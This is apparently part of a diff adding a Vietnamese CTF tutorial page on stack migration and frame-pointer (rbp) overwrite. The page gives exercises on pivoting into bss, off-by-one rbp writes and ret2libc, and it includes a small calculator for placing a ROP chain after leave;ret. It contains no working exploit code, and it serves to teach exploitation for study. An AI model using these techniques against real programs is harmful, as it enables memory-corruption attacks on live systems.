+    <thead><tr><th>Kỹ thuật</th><th>Khác biệt</th></tr></thead>
+    <tbody>
+      <tr><td><a href="stack_pivot.html">stack pivot</a></td><td>Đổi rsp trực tiếp (pop rsp/leave) — migration là pivot + tái dùng hàm qua rbp</td></tr>
+      <tr><td><a href="partial_overwrite.html">partial overwrite</a></td><td>off-by-one rbp = ghi 1 byte; thường brute</td></tr>
+      <tr><td><a href="ret2libc.html">ret2libc</a></td><td>Chain đích sau khi migration vào bss</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>ebp làm frame pointer; leave = mov esp,ebp; pop ebp. Hàm thao tác qua [ebp-X]. Con trỏ 4 byte.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · Migration cơ bản</div><p>Overflow hẹp + hàm read qua rbp: nạp chain vào bss, pivot, ret2libc.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · off-by-one rbp</div><p>Chỉ ghi 1 byte rbp: pivot vào buffer cùng trang + brute.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Reuse nhiều vòng</div><p>Lặp read 2-3 lần để dựng chain dài hơn vùng 1 lần cho phép.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">rbp</div><p>Frame pointer, mốc [rbp-X].</p></div>
+    <div class="card"><div class="term">function reuse</div><p>Gọi lại hàm với rbp mới.</p></div>
+    <div class="card"><div class="term">migration</div><p>Dời stack sang vùng mới.</p></div>
+    <div class="card"><div class="term">after prologue</div><p>Bỏ push rbp; mov rbp,rsp.</p></div>
+    <div class="card"><div class="term">off-by-one rbp</div><p>Ghi 1 byte saved rbp.</p></div>
+    <div class="card"><div class="term">leave; ret</div><p>Epilogue; rsp theo rbp.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="stack_pivot.html">stack_pivot</a> · <a href="partial_overwrite.html">partial_overwrite</a>. Đích: <a href="ret2libc.html">ret2libc</a>.</li>
+    <li>"stack migration / frame pointer overwrite" writeups.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 13.</strong> Kiểm soát rbp → hàm (read/gets) ghi vào rbp−X = nơi ta chọn. Return sau prologue + leave;ret → migration vào bss, dựng chain dài từ overflow hẹp. Tiếp theo: leak techniques.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("frr-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("frr-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  function pv(s){s=(s||"").trim();try{if(/^0x[0-9a-f]+$/i.test(s))return parseInt(s,16);if(/^\d+$/.test(s))return parseInt(s,10);}catch(e){}return null;}
+  var rbpIn=document.getElementById("rbpIn"),out=document.getElementById("out");
+  function calc(){
+    var r=pv(rbpIn.value);
+    if(r===null){out.innerHTML='<div style="color:var(--muted)">nhập hex hợp lệ</div>';return;}
+    var buf=r-0x40, afterLeave=r+8;
+    function row(k,v){return '<div style="display:flex;justify-content:space-between;border:1px solid var(--line);border-radius:7px;padding:8px 11px;background:var(--surface)"><span>'+k+'</span><b style="color:var(--mem)">'+v+'</b></div>';}
+    out.innerHTML=
+      row('read ghi vào (rbp-0x40)','0x'+(buf>>>0).toString(16))+
+      row('sau leave: rsp = rbp','0x'+(r>>>0).toString(16))+
+      row('sau pop rbp: rsp+8','0x'+(afterLeave>>>0).toString(16))+
+      '<div style="font-size:12px;color:var(--muted)">⇒ chain[0] phải đặt tại 0x'+(afterLeave>>>0).toString(16)+' (sau leave;ret)</div>';
+  }
+  rbpIn.addEventListener("input",calc);calc();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
